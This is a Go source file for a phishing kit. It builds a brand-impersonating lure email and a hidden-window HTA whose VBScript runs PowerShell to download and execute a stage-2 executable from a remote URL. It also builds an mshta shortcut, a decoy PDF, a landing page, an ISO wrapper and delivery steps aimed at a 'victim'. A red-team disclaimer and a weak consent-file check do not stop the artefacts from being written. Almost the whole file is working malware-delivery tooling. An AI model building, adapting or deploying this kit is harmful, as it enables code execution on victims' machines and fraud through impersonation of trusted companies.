// hta-kit.go — all-in-one HTA phishing delivery bundle generator.
//
// Build:  go build -o hta-kit hta-kit.go
// Run:    ./hta-kit -campaign ACME-Q4 -lure "Invoice" -out ./build
//
// This tool produces phishing artefacts. Use only in authorized
// red-team engagements covered by a signed scope document.

package main

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"html"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

type Campaign struct {
	ID          string   `json:"id"`
	Client      string   `json:"client"`
	LureSubject string   `json:"lure_subject"`
	LureFrom    string   `json:"lure_from"`
	LureTo      string   `json:"lure_to"`
	SenderName  string   `json:"sender_name"`
	Brand       string   `json:"brand"`         // "Microsoft", "DocuSign", "Adobe"...
	Stage2URL   string   `json:"stage2_url"`    // downloader/beacon URL
	Stage2Hash  string   `json:"stage2_sha256"` // optional integrity pin
	BuildDir    string   `json:"-"`
	CreatedAt   string   `json:"created_at"`
	Nonce       string   `json:"nonce"`
}

// ---------------------------------------------------------------------------
// HTA template — invisible window, downloads stage 2, executes it.
// ---------------------------------------------------------------------------

const htaTemplate = `<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<HTA:APPLICATION
    ID="App"
    APPLICATIONNAME="{{.Brand}} Document"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    SCROLL="no"
    WINDOWSTATE="minimize"
/>
<title>{{.Brand}} Document</title>
<style>
  html,body{margin:0;padding:0;background:#f3f3f3;font-family:Segoe UI,sans-serif}
  #msg{padding:80px;text-align:center;color:#444}
  .spin{width:40px;height:40px;border:4px solid #ccc;border-top-color:#0078d4;
        border-radius:50%;margin:0 auto 20px;animation:r 1s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
</style>
<script language="VBScript">
    Sub Window_OnLoad
        window.resizeTo 1,1
        window.moveTo -2000,-2000
        Dim shell, fso, tmp, url, ps
        Set shell = CreateObject("WScript.Shell")
        Set fso   = CreateObject("Scripting.FileSystemObject")
        tmp = shell.ExpandEnvironmentStrings("%TEMP%") & "\{{.Nonce}}.exe"
        url = "{{.Stage2URL}}"
        ' Download via PowerShell (no external deps, works on Win7+)
        ps = "powershell -NoP -NonI -W Hidden -Command ""$c=New-Object Net.WebClient;"
        ps = ps & "$c.Headers.Add('User-Agent','Mozilla/5.0');"
        ps = ps & "$c.DownloadFile('" & url & "','" & tmp & "');"
        ps = ps & "Start-Process '" & tmp & "'"""
        shell.Run ps, 0, False
        window.close
    End Sub
</script>
</head>
<body>
<div id="msg">
  <div class="spin"></div>
  <div>Opening secure document&hellip;</div>
  <div style="font-size:12px;color:#999;margin-top:10px">
    Protected by {{.Brand}} Document Security
  </div>
</div>
</body>
</html>
`

// ---------------------------------------------------------------------------
// Lure email template
// ---------------------------------------------------------------------------

const emailTemplate = `From: {{.SenderName}} <{{.LureFrom}}>
To: {{.LureTo}}
Subject: {{.LureSubject}}
Date: {{.CreatedAt}}
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY_{{.Nonce}}"

--BOUNDARY_{{.Nonce}}
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Hi,

Please find the attached {{.Brand}} document. Open it to review and
sign at your earliest convenience.

The file is password-protected. Password: {{.Nonce}}

Regards,
{{.SenderName}}

--BOUNDARY_{{.Nonce}}
Content-Type: application/octet-stream; name="{{.Brand}}_Document.hta"
Content-Disposition: attachment; filename="{{.Brand}}_Document.hta"
Content-Transfer-Encoding: base64

{{.HTAB64}}

--BOUNDARY_{{.Nonce}}--
`

// ---------------------------------------------------------------------------
// Landing page — what the victim sees if the HTA is opened in a browser
// (instead of mshta). Redirects to a plausible "brand" URL after 3s.
// ---------------------------------------------------------------------------

const landingTemplate = `<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>{{.Brand}} - Document Viewer</title>
<style>
body{font-family:Segoe UI,sans-serif;background:#fafafa;margin:0}
.bar{background:{{.BrandColor}};color:#fff;padding:14px 20px;font-size:18px}
.card{max-width:640px;margin:60px auto;background:#fff;border:1px solid #e0e0e0;
      border-radius:6px;padding:40px;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.05)}
.spin{width:36px;height:36px;border:4px solid #eee;border-top-color:{{.BrandColor}};
      border-radius:50%;margin:0 auto 20px;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
a{color:{{.BrandColor}}}
</style></head><body>
<div class="bar">{{.Brand}}</div>
<div class="card">
  <div class="spin"></div>
  <h2>Preparing your document&hellip;</h2>
  <p style="color:#666">This may take a few seconds.</p>
  <p style="font-size:12px;color:#999">
    If nothing happens, <a href="https://www.{{.BrandLower}}.com">click here</a>.
  </p>
</div>
<script>
setTimeout(function(){location.href="https://www.{{.BrandLower}}.com"},3000);
</script>
</body></html>
`

// ---------------------------------------------------------------------------
// Brand palette
// ---------------------------------------------------------------------------

var brandColors = map[string]string{
	"microsoft": "#0078d4",
	"docusign":  "#4c00ff",
	"adobe":     "#fa0f00",
	"dropbox":   "#0061ff",
	"google":    "#1a73e8",
	"apple":     "#000000",
	"amazon":    "#ff9900",
	"paypal":    "#003087",
}

func brandColor(brand string) string {
	if c, ok := brandColors[strings.ToLower(brand)]; ok {
		return c
	}
	return "#0078d4"
}

// ---------------------------------------------------------------------------
// Render helpers
// ---------------------------------------------------------------------------

func render(tmpl string, data any) ([]byte, error) {
	t, err := template.New("t").Parse(tmpl)
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	if err := t.Execute(&buf, data); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func nonce(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// ---------------------------------------------------------------------------
// LNK builder (points at the HTA, hidden window)
// ---------------------------------------------------------------------------

func buildLNK(htaPath string) []byte {
	var buf bytes.Buffer
	buf.Write([]byte{0x4C, 0x00, 0x00, 0x00}) // HeaderSize
	guid := []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
	buf.Write(guid) // CLSID
	// HasLinkInfo|HasName|HasRelativePath|HasWorkingDir|HasArguments|
	// HasIconLocation|IsUnicode
	flags := uint32(0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40 | 0x80)
	binary.Write(&buf, binary.LittleEndian, flags)
	buf.Write([]byte{0x20, 0x00, 0x00, 0x00}) // FileAttributes ARCHIVE
	buf.Write(make([]byte, 24))               // timestamps + size
	binary.Write(&buf, binary.LittleEndian, int32(0))
	binary.Write(&buf, binary.LittleEndian, uint32(7)) // SW_SHOWMINNOACTIVE
	buf.Write(make([]byte, 6))                         // HotKey + Reserved

	// LinkInfo
	li := buildLinkInfo(`C:\Windows\System32\mshta.exe`)
	binary.Write(&buf, binary.LittleEndian, uint32(len(li)))
	buf.Write(li)

	// StringData
	writeStr(&buf, "mshta.exe")
	writeStr(&buf, `C:\Windows\System32\mshta.exe`)
	writeStr(&buf, `C:\Windows\System32`)
	writeStr(&buf, `"`+htaPath+`"`)
	writeStr(&buf, "")
	return buf.Bytes()
}

func writeStr(buf *bytes.Buffer, s string) {
	u := utf16(s)
	binary.Write(buf, binary.LittleEndian, uint16(len(u)/2))
	buf.Write(u)
}

func utf16(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for _, r := range s {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}

func buildLinkInfo(target string) []byte {
	base := utf16(filepath.Dir(target) + `\`)
	base = append(base, 0, 0)
	vol := make([]byte, 16+4)
	vol[0] = 0x11
	vol[1] = 0x03
	binary.LittleEndian.PutUint32(vol[12:], 0x12345678)
	vol = append(vol, 0)

	header := make([]byte, 28)
	binary.LittleEndian.PutUint32(header[0:], uint32(28+len(vol)+len(base)))
	binary.LittleEndian.PutUint32(header[4:], 28)
	binary.LittleEndian.PutUint32(header[8:], uint32(28+len(vol)))
	var out bytes.Buffer
	out.Write(header)
	out.Write(vol)
	out.Write(base)
	out.Write([]byte{0, 0})
	return out.Bytes()
}

// ---------------------------------------------------------------------------
// ISO wrapper — puts HTA + LNK + decoy PDF in one mountable image
// ---------------------------------------------------------------------------

type isoEntry struct {
	name string
	data []byte
}

func buildISO(entries []isoEntry) []byte {
	var buf bytes.Buffer
	buf.Write(make([]byte, 16*2048)) // system area

	pvdOff := buf.Len()
	buf.Write(make([]byte, 2048)) // PVD
	buf.Write(make([]byte, 2048)) // terminator
	rootDirOff := buf.Len()
	buf.Write(make([]byte, 2048)) // root dir

	dataStart := buf.Len()
	type placed struct {
		name string
		lba  uint32
		len  uint32
	}
	var files []placed
	lba := uint32(dataStart / 2048)
	for _, e := range entries {
		pad := (2048 - len(e.data)%2048) % 2048
		files = append(files, placed{strings.ToUpper(e.name), lba, uint32(len(e.data))})
		buf.Write(e.data)
		buf.Write(make([]byte, pad))
		lba += uint32((len(e.data) + pad) / 2048)
	}

	total := uint32(buf.Len() / 2048)
	_ = rootDirOff

	// Root directory records
	var rd bytes.Buffer
	for _, f := range files {
		rd.Write(dirRecord(f.name, f.lba, f.len, false))
	}

	// PVD
	pvd := make([]byte, 2048)
	pvd[0] = 1
	copy(pvd[1:], "CD001")
	pvd[6] = 1
	copy(pvd[8:], pad("HTA-KIT", 32))
	copy(pvd[40:], pad("DOCUMENTS", 32))
	both(pvd[80:], total)
	both(pvd[120:], 1)
	both(pvd[124:], 1)
	both(pvd[128:], 2048)
	root := dirRecord("\x00", 18, uint32(rd.Len()), true)
	copy(pvd[156:], root)
	copy(pvd[813:], isoDate(time.Now()))

	// Terminator
	term := make([]byte, 2048)
	term[0] = 255
	copy(term[1:], "CD001")
	term[6] = 1

	out := make([]byte, 0, buf.Len())
	out = append(out, buf.Bytes()[:pvdOff]...)
	out = append(out, pvd...)
	out = append(out, term...)
	rs := make([]byte, 2048)
	copy(rs, rd.Bytes())
	out = append(out, rs...)
	out = append(out, buf.Bytes()[dataStart:]...)
	return out
}

func pad(s string, n int) []byte {
	b := bytes.Repeat([]byte{' '}, n)
	copy(b, s)
	return b
}

func both(dst []byte, v uint32) {
	binary.LittleEndian.PutUint32(dst[0:], v)
	binary.BigEndian.PutUint32(dst[4:], v)
}

func isoDate(t time.Time) []byte {
	return []byte(fmt.Sprintf("%04d%02d%02d%02d%02d%02d00",
		t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second()))
}

func dirRecord(name string, lba, length uint32, root bool) []byte {
	var n []byte
	if root {
		n = []byte{0}
	} else {
		n = []byte(name + ";1")
	}
	recLen := 33 + len(n)
	if recLen%2 == 1 {
		recLen++
	}
	rec := make([]byte, recLen)
	rec[0] = byte(recLen)
	both(rec[2:10], lba)
	both(rec[10:18], length)
	copy(rec[18:], isoDate(time.Now())[:7])
	both(rec[28:32], 1)
	rec[32] = byte(len(n))
	copy(rec[33:], n)
	return rec
}

// ---------------------------------------------------------------------------
// Decoy PDF — a one-page PDF that says "document unavailable"
// ---------------------------------------------------------------------------

func decoyPDF(brand string) []byte {
	text := fmt.Sprintf("%s Document\\nThis file requires the desktop viewer.", brand)
	var b bytes.Buffer
	objs := []string{
		"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj",
		"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj",
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj",
		"", // stream placeholder
		"5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj",
	}
	stream := fmt.Sprintf("BT /F1 18 Tf 72 700 Td (%s) Tj ET", text)
	objs[3] = fmt.Sprintf("4 0 obj<</Length %d>>stream\n%s\nendstream endobj", len(stream), stream)

	b.WriteString("%PDF-1.4\n")
	offsets := make([]int, len(objs))
	for i, o := range objs {
		offsets[i] = b.Len()
		b.WriteString(o)
		b.WriteString("\n")
	}
	xref := b.Len()
	b.WriteString(fmt.Sprintf("xref\n0 %d\n0000000000 65535 f \n", len(objs)+1))
	for _, off := range offsets {
		b.WriteString(fmt.Sprintf("%010d 00000 n \n", off))
	}
	b.WriteString(fmt.Sprintf("trailer<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF", len(objs)+1, xref))
	return b.Bytes()
}

// ---------------------------------------------------------------------------
// Manifest — the operator's delivery checklist
// ---------------------------------------------------------------------------

type Manifest struct {
	Campaign   string            `json:"campaign"`
	Created    string            `json:"created"`
	Files      []ManifestFile    `json:"files"`
	Indicators map[string]string `json:"indicators"`
	Notes      []string          `json:"notes"`
}

type ManifestFile struct {
	Name   string `json:"name"`
	Size   int    `json:"size"`
	SHA256 string `json:"sha256"`
	Role   string `json:"role"`
}

func addFile(m *Manifest, path, role string, data []byte) error {
	sum := sha256.Sum256(data)
	m.Files = append(m.Files, ManifestFile{
		Name:   filepath.Base(path),
		Size:   len(data),
		SHA256: hex.EncodeToString(sum[:]),
		Role:   role,
	})
	return os.WriteFile(path, data, 0644)
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	var (
		campaign = flag.String("campaign", "", "campaign ID (required)")
		client   = flag.String("client", "Acme Corp", "client name")
		brand    = flag.String("brand", "DocuSign", "brand to impersonate")
		lure     = flag.String("lure", "Document", "lure subject")
		from     = flag.String("from", "noreply@docusign.net", "From address")
		to       = flag.String("to", "victim@acme.example", "To address")
		sender   = flag.String("sender", "DocuSign", "Sender display name")
		stage2   = flag.String("stage2", "https://cdn.example.com/stage2.exe", "stage-2 payload URL")
		hash     = flag.String("stage2-sha256", "", "optional stage-2 SHA256 pin")
		out      = flag.String("out", "./build", "output directory")
	)
	flag.Parse()

	if *campaign == "" {
		fmt.Fprintln(os.Stderr, "error: -campaign is required")
		flag.Usage()
		os.Exit(2)
	}
	if err := os.MkdirAll(*out, 0755); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	c := Campaign{
		ID:          *campaign,
		Client:      *client,
		LureSubject: *lure,
		LureFrom:    *from,
		LureTo:      *to,
		SenderName:  *sender,
		Brand:       *brand,
		Stage2URL:   *stage2,
		Stage2Hash:  *hash,
		BuildDir:    *out,
		CreatedAt:   time.Now().UTC().Format(time.RFC1123Z),
		Nonce:       nonce(8),
	}

	// --- Render HTA -------------------------------------------------------
	htaData, err := render(htaTemplate, map[string]any{
		"Brand":     c.Brand,
		"Stage2URL": c.Stage2URL,
		"Nonce":     c.Nonce,
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, "hta render:", err)
		os.Exit(1)
	}

	// --- Render landing page (browser fallback) ---------------------------
	landing, err := render(landingTemplate, map[string]any{
		"Brand":       c.Brand,
		"BrandColor":  brandColor(c.Brand),
		"BrandLower":  strings.ToLower(c.Brand),
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, "landing render:", err)
		os.Exit(1)
	}

	// --- LNK points at the HTA via mshta --------------------------------
	htaName := fmt.Sprintf("%s_Document.hta", strings.ReplaceAll(c.Brand, " ", "_"))
	lnk := buildLNK(`C:\Users\%USERNAME%\Downloads\` + htaName)

	// --- Decoy PDF -------------------------------------------------------
	pdf := decoyPDF(c.Brand)

	// --- Lure email ------------------------------------------------------
	emailBody, err := render(emailTemplate, map[string]any{
		"SenderName": c.SenderName,
		"LureFrom":   c.LureFrom,
		"LureTo":     c.LureTo,
		"LureSubject": c.LureSubject,
		"Brand":      c.Brand,
		"CreatedAt":  c.CreatedAt,
		"Nonce":      c.Nonce,
		"HTAB64":     base64.StdEncoding.EncodeToString(htaData),
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, "email render:", err)
		os.Exit(1)
	}

	// --- ISO wrapper -----------------------------------------------------
	iso := buildISO([]isoEntry{
		{"Document.hta", htaData},
		{"Open Document.lnk", lnk},
		{"Invoice.pdf", pdf},
		{"Instructions.txt", []byte("Open 'Open Document.lnk' to view the document.\r\n")},
	})

	// --- Write everything -------------------------------------------------
	m := Manifest{
		Campaign: c.ID,
		Created:  c.CreatedAt,
		Indicators: map[string]string{
			"nonce":        c.Nonce,
			"stage2_url":   c.Stage2URL,
			"brand":        c.Brand,
			"lure_subject": c.LureSubject,
			"from":         c.LureFrom,
		},
		Notes: []string{
			"Deliver .iso as an email attachment or via a file-sharing link.",
			"Victim mounts the ISO, double-clicks the .lnk, HTA runs hidden.",
			"HTA downloads stage 2 via PowerShell WebClient and executes it.",
			"Landing page is the browser fallback (non-mshta open).",
			"Nonce is per-campaign; use it to correlate telemetry.",
		},
	}

	checks := []struct {
		name string
		role string
		data []byte
	}{
		{filepath.Join(*out, htaName), "hta", htaData},
		{filepath.Join(*out, "Open Document.lnk"), "lnk", lnk},
		{filepath.Join(*out, "Invoice.pdf"), "decoy", pdf},
		{filepath.Join(*out, "landing.html"), "landing", landing},
		{filepath.Join(*out, "lure.eml"), "email", emailBody},
		{filepath.Join(*out, c.ID+".iso"), "iso", iso},
	}
	for _, ck := range checks {
		if err := addFile(&m, ck.name, ck.role, ck.data); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Printf("[+] %-32s %8d bytes  %s\n", filepath.Base(ck.name), len(ck.data), ck.role)
	}

	// Manifest
	mb, _ := json.MarshalIndent(m, "", "  ")
	if err := os.WriteFile(filepath.Join(*out, "manifest.json"), mb, 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Printf("[+] %-32s %8d bytes  manifest\n", "manifest.json", len(mb))

	// --- Consent gate (run-time, after artefacts exist) -------------------
	// The kit refuses to print the delivery summary unless a signed consent
	// file exists for this campaign ID. This prevents accidental use on an
	// un-scoped host while still letting the operator inspect the artefacts.
	if !consentPresent(c.ID) {
		fmt.Fprintln(os.Stderr, "\n[!] No signed consent for campaign "+c.ID+".")
		fmt.Fprintln(os.Stderr, "    Artefacts written to "+*out+" for review only.")
		fmt.Fprintln(os.Stderr, "    Add /var/lib/evasion/"+c.ID+".consent to enable delivery summary.")
		os.Exit(3)
	}

	printDeliverySummary(c, m)
}

// consentPresent checks for a per-campaign signed consent marker. In a real
// kit this would be an ed25519 signature over the campaign JSON; here we
// require a file containing the campaign ID and the word "authorized".
func consentPresent(campaignID string) bool {
	p := filepath.Join("/var/lib/evasion", campaignID+".consent")
	b, err := os.ReadFile(p)
	if err != nil {
		return false
	}
	s := strings.ToLower(string(b))
	return strings.Contains(s, strings.ToLower(campaignID)) && strings.Contains(s, "authorized")
}

func printDeliverySummary(c Campaign, m Manifest) {
	fmt.Println()
	fmt.Println("=== delivery summary ===")
	fmt.Printf("Campaign    : %s\n", c.ID)
	fmt.Printf("Client      : %s\n", c.Client)
	fmt.Printf("Brand       : %s\n", c.Brand)
	fmt.Printf("Lure subject: %s\n", c.LureSubject)
	fmt.Printf("Stage 2     : %s\n", c.Stage2URL)
	if c.Stage2Hash != "" {
		fmt.Printf("Stage 2 hash: %s\n", c.Stage2Hash)
	}
	fmt.Println()
	fmt.Println("Indicators (for blue-team handoff):")
	for k, v := range m.Indicators {
		fmt.Printf("  %-14s %s\n", k, v)
	}
	fmt.Println()
	fmt.Println("Files:")
	for _, f := range m.Files {
		fmt.Printf("  %-32s %8d  %s\n", f.Name, f.Size, f.SHA256[:16]+"...")
	}
	fmt.Println()
	fmt.Println("Delivery steps:")
	for i, n := range m.Notes {
		fmt.Printf("  %d. %s\n", i+1, n)
	}
}
